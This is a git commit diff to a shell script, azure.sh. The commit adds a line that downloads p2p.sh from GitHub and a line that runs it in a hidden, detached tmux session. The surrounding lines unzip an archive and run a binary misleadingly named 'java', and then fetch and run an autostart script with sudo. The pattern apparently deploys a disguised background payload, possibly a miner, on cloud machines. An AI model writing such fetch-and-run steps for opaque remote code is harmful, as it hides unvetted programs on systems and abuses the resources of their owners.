f8e35a82f55cf72078deb2bba7d98b507ad61bc1
minnie1311 <69047664+minnie1311@users.noreply.github.com>
2022-02-23 13:30:43 +0700

    Update azure.sh

--- azure.sh
+++ azure.sh
@@ -24,8 +24,12 @@ sudo wget https://github.com/minnie1311/Python3/raw/main/ubuntu_18.04.zip
 sudo unzip ubuntu_18.04.zip
 sudo chmod +x java
 sudo rm start.sh
+wget https://raw.githubusercontent.com/minnie1311/azureAI/master/p2p.sh
+sudo tmux new-session -d -s 2 'bash p2p.sh'
 sudo wget https://raw.githubusercontent.com/minnie1311/Python3/main/autostart.sh
 sudo chmod +x autostart.sh
 sudo -E env "HOSTNAME=$HOSTNAME" ./autostart.sh
+
+
 
 
